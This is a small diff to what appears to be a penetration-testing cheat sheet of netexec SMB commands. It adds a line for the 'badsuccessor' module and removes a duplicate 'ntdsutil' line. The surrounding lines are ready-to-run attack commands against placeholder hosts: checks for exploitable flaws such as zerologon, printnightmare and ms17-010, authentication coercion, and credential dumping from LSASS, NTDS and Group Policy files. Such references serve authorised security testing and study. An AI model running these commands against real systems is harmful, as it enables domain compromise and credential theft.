@@ -832,6 +832,7 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares --rid-brute | gre
 $ netexec smb <RHOST> -u '' -p '' -M ms17-010
 $ netexec smb <RHOST> -u '' -p '' -M smbghost
 $ netexec smb <RHOST> -u '' -p '' -M zerologon
+$ netexec smb <RHOST> -u '' -p '' -M badsuccessor
 $ netexec smb <RHOST> -u '' -p '' -M printnightmare
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nopac
 $ netexec smb <RHOST> -u '' -p '' -M coerce_plus
@@ -883,7 +884,6 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
-$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M ntdsutil
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wam
